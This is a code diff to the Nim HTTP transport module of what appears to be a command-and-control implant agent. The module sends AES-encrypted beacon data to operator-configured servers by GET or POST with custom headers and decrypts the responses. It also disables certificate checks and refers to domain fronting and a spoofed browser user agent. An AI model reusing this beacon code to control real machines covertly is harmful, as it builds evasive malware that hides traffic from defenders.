@@ -10,6 +10,7 @@ import json
 import uri
 import tables
 import std/strformat
+import std.enumerate
 import ../commands/upload
 when defined(AESPSK):
     from crypto import encryptStr,decryptStr
@@ -18,7 +19,7 @@ when defined(AESPSK):
 # TODO sort config
 proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} = 
     var tempData = bdata
-    let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
+    
     var proxySet = false
     #var myProxy : Proxy
     when not defined(release):
@@ -36,18 +37,24 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
 
     when not defined(release):
         echo "still need proxy fix!!!"
-    var headers: HttpHeaders
-    headers["UserAgent"] = if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 
+    var headers: HttpHeaders 
+    
+    
+    
+    let jsonObj = parseJson(curConfig.Headers)
+    
+    for key,value in jsonObj.getFields:                    
+        headers[key] = value.getStr()
+    
 
 
 
     when not defined(release):
         echo "Client has been created"
     
-    if(curConfig.HostHeader != "domain_front"):
-        
-        headers["Host"] = curConfig.HostHeader
+    #if(curConfig.HostHeader != "domain_front"):        s
+        #headers["Host"] = curConfig.HostHeader
         
     #var temp = curConfig
     #temp.Servers.sort(serverCmp)  
@@ -57,41 +64,54 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
     var req: Request
     var responseCode: int
     try:
-        if isGet:
-            when not defined(release):
-                echo "Attempting to create get url"
-                echo "dataToSend: ", dataToSend
-                echo "curConfig: ", $(curConfig)
-                echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
-                #echo "get url: ", $(parseUri(curConfig.Servers[0].Domain)) & curConfig.GetUrl & "?" & curConfig.Param
-                echo "making request"
+        when not defined(release):
+            echo "curConfig: ", $(curConfig)
+            echo "making request"
+            echo "rawData", tempData
             
-            #result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
+
+        if isGet:
+            let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata,true) else: bdata
+            when not defined(release):             
+                echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
+                echo "dataToSend: ", dataToSend
+                
+                when defined(AESPSK):
+                    echo "decrypted data to send: ", decryptStr(curConfig.PayloadUUID, curConfig.Psk, dataToSend)
+                else:
+                    echo "decrypted data to send: ", decode(dataToSend)     
+                
             
             req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})), verb : "get", headers : headers,  allowAnyHttpsCertificate : true)
             
-            let pupyresponse = fetch(req)
-            responseCode = pupyresponse.code
-            result = pupyresponse.body
-        else:
-            when not defined(release):
-                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)
-                echo "dataToSend: ", dataToSend
-                echo "sending data: ", tempData
 
-            
-            
+        else:
+            let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
+            when not defined(release):
+                
+                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)
+                echo "dataToSend: ", dataToSend                
+                when defined(AESPSK):
+                    echo "decrypted data to send: ", decryptStr(curConfig.PayloadUUID, curConfig.Psk, dataToSend)
+                else:
+                    echo "decrypted data to send: ", decode(dataToSend) 
+                                                     
             req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)), verb : "post", headers : headers, body : dataToSend, allowAnyHttpsCertificate : true)
-            let pupyresponse = fetch(req)
-            responseCode = pupyresponse.code
-            result = pupyresponse.body
+        
+        
+        let pupyresponse = fetch(req)
+        responseCode = pupyresponse.code
+        result = pupyresponse.body
+
+
         when not defined(release):
             echo "response code: ", $(responseCode)
             echo "Just received data back from get or post request: ", result
+            
         when defined(AESPSK):
-            echo "inside post request just received back: encrypted: ", result
+            
             result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
-            echo "after post request decrypted data: ", result
+            
     except:
         let
             e = getCurrentException()
